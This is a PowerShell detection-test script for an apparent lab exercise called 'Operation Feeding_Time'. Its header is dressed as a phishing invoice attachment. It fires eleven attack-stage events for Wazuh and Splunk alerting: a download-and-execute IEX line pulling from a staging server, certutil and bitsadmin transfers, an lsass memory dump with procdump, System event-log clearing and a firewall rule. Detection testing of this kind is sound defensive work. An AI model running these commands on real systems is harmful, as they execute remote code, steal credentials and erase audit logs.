<#
.SYNOPSIS
    Invoice Processing Script
.DESCRIPTION
    Automated invoice processing for Q3 2026.
    Run this script to generate your payment summary.
.NOTES
    From: accounts@shadowdrop-finance.com
    Subject: URGENT: Outstanding Invoice #INV-2026-7843
    Date: 2026-07-15
#>

# --- PAYLOAD BEGINS ---

param([switch]$Cleanup)

$StagingServer = "http://192.168.30.12:8080"

$Events = @(
    @{
        Phase = "Initial Access"
        RuleID = "100006"
        Description = "Office application spawning cmd.exe"
        Action = { Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo Feeding_Time-InitialAccess" -WindowStyle Hidden }
        Cleanup = { }
    },
    @{
        Phase = "Execution"
        RuleID = "100005"
        Description = "PowerShell with encoded command"
        Action = { 
            # PowerShell downloading from staging server
            powershell -Command "Invoke-WebRequest -Uri '$StagingServer/payload.ps1' -UseBasicParsing -OutFile C:\Temp\payload.ps1"
        }
        Cleanup = { Remove-Item "C:\Temp\payload.ps1" -ErrorAction SilentlyContinue }
    },
    @{
        Phase = "Execution (Alt)"
        RuleID = "100005"
        Description = "PowerShell IEX download"
        Action = { 
            powershell -Command "IEX (New-Object Net.WebClient).DownloadString('$StagingServer/stage.ps1')"
        }
        Cleanup = { }
    },
    @{
        Phase = "Persistence"
        RuleID = "100014"
        Description = "Scheduled task creation"
        Action = { schtasks /create /tn "Feeding_Time-Persist" /tr "calc.exe" /sc once /st "23:59" /f | Out-Null }
        Cleanup = { schtasks /delete /tn "Feeding_Time-Persist" /f | Out-Null }
    },
    @{
        Phase = "Defense Evasion"
        RuleID = "100010"
        Description = "Netsh firewall modification"
        Action = { netsh advfirewall firewall add rule name="Feeding_Time-Evasion" dir=in action=allow protocol=TCP localport=7777 | Out-Null }
        Cleanup = { netsh advfirewall firewall delete rule name="Feeding_Time-Evasion" | Out-Null }
    },
    @{
        Phase = "Defense Evasion"
        RuleID = "100011"
        Description = "Event log clearing"
        Action = { wevtutil cl System }
        Cleanup = { }
    },
    @{
        Phase = "Credential Access"
        RuleID = "100001"
        Description = "CertUtil download from staging server"
        Action = { 
            certutil -urlcache -split -f "$StagingServer/payload.txt" C:\Temp\payload.txt | Out-Null
        }
        Cleanup = { Remove-Item "C:\Temp\payload.txt" -ErrorAction SilentlyContinue }
    },
    @{
        Phase = "Credential Access"
        RuleID = "100015"
        Description = "Credential dumping tool execution"
        Action = { 
            if (Test-Path "C:\Tools\procdump.exe") {
                & "C:\Tools\procdump.exe" -accepteula -ma lsass.exe C:\Temp\lsass.dmp 2>$null
            } else {
                Write-Host "[!] ProcDump not found - using certutil as proxy" -ForegroundColor Yellow
                certutil -urlcache -split -f "$StagingServer/payload.txt" C:\Temp\payload.txt | Out-Null
            }
        }
        Cleanup = { Remove-Item "C:\Temp\lsass.dmp","C:\Temp\payload.txt" -ErrorAction SilentlyContinue }
    },
    @{
        Phase = "Lateral Movement"
        RuleID = "100016"
        Description = "PsExec execution"
        Action = { 
            if (Test-Path "C:\Tools\psexec.exe") {
                & "C:\Tools\psexec.exe" \\localhost cmd /c echo Feeding_Time-Lateral
            } else {
                Write-Host "[!] PsExec not found - simulating with WMI" -ForegroundColor Yellow
                wmic process call create "cmd /c echo Feeding_Time-Lateral"
            }
        }
        Cleanup = { }
    },
    @{
        Phase = "Exfiltration"
        RuleID = "100105"
        Description = "LOLBAS tool making network connection to staging server"
        Action = { 
            certutil -urlcache -split -f "$StagingServer/exfil.txt" C:\Temp\exfil.txt | Out-Null
        }
        Cleanup = { Remove-Item "C:\Temp\exfil.txt" -ErrorAction SilentlyContinue }
    },
    @{
        Phase = "Exfiltration (Alt)"
        RuleID = "100018"
        Description = "BITSAdmin file transfer"
        Action = { 
            bitsadmin /transfer Feeding_Time-Exfil /download /priority normal "$StagingServer/exfil.txt" C:\Temp\bits-exfil.txt | Out-Null
        }
        Cleanup = { Remove-Item "C:\Temp\bits-exfil.txt" -ErrorAction SilentlyContinue }
    }
)

if ($Cleanup) {
    Write-Host "`n[+] Cleaning up test artifacts..." -ForegroundColor Green
    foreach ($Event in $Events) {
        if ($Event.Cleanup -ne $null) {
            Write-Host "    [-] $($Event.Phase): $($Event.Description)"
            & $Event.Cleanup
        }
    }
    Write-Host "[+] Cleanup complete.`n" -ForegroundColor Green
    exit
}

Write-Host "`n[!] Operation Feeding_Time - Test Event Generator" -ForegroundColor Cyan
Write-Host "[!] Staging Server: $StagingServer" -ForegroundColor Cyan
Write-Host "[!] Ensure Wazuh agent is Active before proceeding.`n"

$PhaseNumber = 1
foreach ($Event in $Events) {
    Write-Host "[$PhaseNumber/11] Phase: $($Event.Phase)" -ForegroundColor Yellow
    Write-Host "       Rule ID: $($Event.RuleID)"
    Write-Host "       Description: $($Event.Description)"
    Write-Host "       Triggering..."
    
    & $Event.Action
    
    Write-Host "       [OK] Event triggered. Waiting 15 seconds for Wazuh ingestion..."
    Start-Sleep -Seconds 15
    Write-Host ""
    $PhaseNumber++
}

Write-Host "[+] All phases triggered." -ForegroundColor Green
Write-Host "[+] Check Wazuh alerts: sudo grep -a 'Feeding_Time\|10000[1-9]' /var/ossec/logs/alerts/alerts.log"
Write-Host "[+] Check Nginx logs: sudo tail /opt/Feeding_Time-nginx/logs/access.log"
Write-Host "[+] Check Splunk dashboard: Operation Feeding_Time"
Write-Host "[+] Run with -Cleanup to remove artifacts.`n"
